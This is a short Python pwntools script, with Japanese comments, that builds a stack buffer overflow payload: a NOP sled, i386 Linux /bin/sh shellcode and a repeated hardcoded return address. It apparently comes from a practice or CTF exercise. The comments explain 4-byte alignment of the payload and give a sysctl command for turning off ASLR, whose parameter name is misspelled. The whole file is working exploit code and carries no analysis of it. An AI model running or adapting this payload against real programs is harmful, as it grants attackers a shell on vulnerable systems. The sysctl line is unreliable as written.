from pwn import *
import sys
import struct

def gen_payload_file(payload):
    f = open('payload2', 'wb')
    f.write(payload)
    f.close()

nop_sled = b'\x90' * 136
shellcode = asm(shellcraft.i386.linux.sh())
return_addr = struct.pack('I', 0xffffd394) * 132

payload = nop_sled + shellcode + return_addr
sys.stdout.buffer.write(payload)
# gen_payload_file(payload)

# nop sled を4(バイト数)で割り切れるようにする必要がある。
# shellcodeも4で割り切れる44バイト
# じゃないとリターンアドレスが4バイトに整列しないから、セグフォる。
# リターンアドレスは適宜変える

# ASLRをオフ
# sysctl -w kernel.randomize_va_spase=0
